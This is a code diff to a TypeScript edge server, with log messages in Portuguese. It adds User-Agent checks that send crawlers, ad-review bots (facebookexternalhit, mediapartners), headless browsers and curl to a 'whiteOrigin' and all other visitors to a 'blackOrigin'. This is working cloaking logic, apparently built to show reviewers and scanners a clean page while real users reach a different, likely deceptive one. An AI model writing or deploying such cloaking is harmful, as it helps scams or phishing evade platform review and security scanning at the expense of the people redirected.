@@ -30,19 +30,46 @@ function normalizeTarget(url: string | undefined | null): string | null {
 
 app.use(async (req: any, res) => {
   try {
-    const host = normalizeHost(req.headers["x-forwarded-host"] || req.headers.host || "");
+    const host = normalizeHost(
+      req.headers["x-forwarded-host"] || req.headers.host || ""
+    );
     if (!host) return res.status(400).send("Host header required");
 
+    const ua = req.headers["user-agent"]?.toLowerCase() || "";
+
     console.log("[EDGE] Requisição recebida para host:", host);
-    console.error("[DEBUG UA]", req.headers['user-agent'] || "(sem UA)");
+    console.log("[DEBUG UA]", ua || "(sem UA)");
+
     // chamada para API central
     const resp = await axios.get(`${API_URL}/domains/resolve`, {
       params: { host },
       timeout: 5000,
     });
-    
+
     const data = resp.data;
-    let target = normalizeTarget(data.blackOrigin || data.whiteOrigin);
+
+    // regra de bot
+    const isBot = /bot|crawl|slurp|spider|mediapartners|facebookexternalhit|headlesschrome|curl/i.test(
+      ua
+    );
+
+    console.log("[DEBUG ISBOT]", isBot);
+
+    let target: string | null = null;
+
+    if (isBot) {
+      target = normalizeTarget(data.whiteOrigin);
+      console.log("[EDGE] Bot detectado → enviando para whiteOrigin");
+    } else {
+      target = normalizeTarget(data.blackOrigin);
+      console.log("[EDGE] Usuário normal → enviando para blackOrigin");
+    }
+
+    // fallback caso esteja vazio
+    if (!target) {
+      target = normalizeTarget(data.blackOrigin || data.whiteOrigin);
+      console.warn("[EDGE] Fallback acionado → target:", target);
+    }
 
     if (!target) {
       console.error("[EDGE] Nenhum destino configurado para host:", host, "data:", data);
@@ -50,7 +77,6 @@ app.use(async (req: any, res) => {
     }
 
     console.log(`[EDGE] Redirecionando ${host} -> ${target}`);
-    //teste
 
     res.setHeader("Cache-Control", "no-store");
     return res.redirect(302, target);
